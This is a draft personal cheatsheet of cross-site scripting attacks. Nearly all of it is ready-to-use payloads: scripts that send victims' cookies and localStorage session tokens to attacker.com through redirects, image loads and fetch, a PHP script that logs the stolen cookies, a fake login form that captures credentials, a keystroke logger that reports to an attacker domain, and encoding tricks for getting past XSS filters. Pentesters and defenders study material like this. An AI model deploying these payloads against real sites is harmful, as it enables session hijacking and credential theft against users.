---
created: 2026-06-20
tags:
  - web_hacking
  - client-side
  - cheatsheet
status: draft
---
- https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code

## Exploitation

### Stealing cookies

#### DOM-based redirect

```html
<script>
	document.location='https://attacker.com/capture?c='+document.cookie
</script>
```

- The code DOM-redirects the victim to your controlled domain. 
- The cookie string (retrieved via `document.cookie`) is appended to the redirect URL as a query parameter.
- As a result, the cookie string appears in your server logs as part of `https://attacker.com/capture?c=`. 

>[!note] `document.cookie` reads all non-`HttpOnly` cookies available to JavaScript.

---

```html
<script>
	document.location='https://attacker.com/capture?'+
localStorage.getItem('session')
</script>
```

- The code DOM-redirects the victim to your controlled domain. 
- `localStorage.getItem('session')` retrieves the value of the `session` cookie from `localStorage` and appends it to the redirect URL. 
- As a result, the `session` cookie value appears in your server logs as part of `https://attacker.com/capture?c=`. 


>[!tip]+
> - To capture and save the stolen cookies into a file on your exploit server, you can use this code:
> 
> ```php
> <?php
> $cookie = $_GET['c'];
> $fp = fopen('cookies.txt', 'a+');
> fwrite($fp, 'Cookie:' .$cookie."\r\n");
> fclose($fp);
> ?>
> ```
#### Image load

```html
<script>
	new Image().src="https://attacker.com/capture?c="+document.cookie;
</script>
```

- `new Image()` creates an `<img>` element on the page.
- `Image().src` sets the `src` attribute of the element.
- As soon as the victim navigates the exploit page, their browser automatically fetches a resource specified in `src`. 
- `+document.cookie` appends their cookie string to the target URL.
- As a result, the cookie string appears in your server logs as part of `https://attacker.com/capture?c=`. 

---
```html
<script>
	new Image().src="https://attacker.com/capture?c="+localStorage.getItem('session');
</script>
```

- `new Image()` creates an `<img>` element on the page.
- `Image().src` sets the `src` attribute of the element.
- As soon as the victim navigates the exploit page, their browser automatically fetches a resource specified in `src`. 
- `+localStorage.getItem('session')` retrieves the value of the `session` cookie from `localStorage` and appends it to the target URL.
- As a result, the `session` cookie value appears in your server logs as part of `https://attacker.com/capture?c=`. 

#### CORS

```js
fetch('https://attacker.com', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});
```

### Capturing credentials

#### UI redressing

```html
<script>
	history.replaceState(null, null, '../../../login');
	document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```

### Keylogger

```html
<img src=x onerror='document.onkeypress=function(e){fetch("http://[ATTACKER.DOMAIN.TLD]/?k="+String.fromCharCode(e.which))},this.remove();'>

```
## Filter evasion

### Encoding

- `eval()` + Base64:

```bash
eval(atob(YWxlcnQoIlhTUyIp))
```


- [`fromCharCode()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode):

```html
<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
               <!-- alert("XSS") -->
```

>[!tip] Use this if the application doesn't allow quotes of any kind.

- Decimal HTML character references:

```html
 <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
```

- Hexadecimal HTML character references without trailing semicolons:

```html
<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
```

### Unexpected characters

- Insert a tab:

```html
<a href="jav   ascript:alert('XSS');">Click Me</a>
```

- Insert an encoded tab:

```html
<a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
```

- Insert a newline:

```html
<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
```

- Insert a carriage return:

```html
<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
```

- Insert a null character:

```bash
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
```

>[!note] See [ASCII table](https://man7.org/linux/man-pages/man7/ascii.7.html) for reference.

- Insert spaces and meta-characters before JavaScript in images:

```html
<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
```
## References and further reading

- https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/#other-ways
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#restricted-characters

- https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html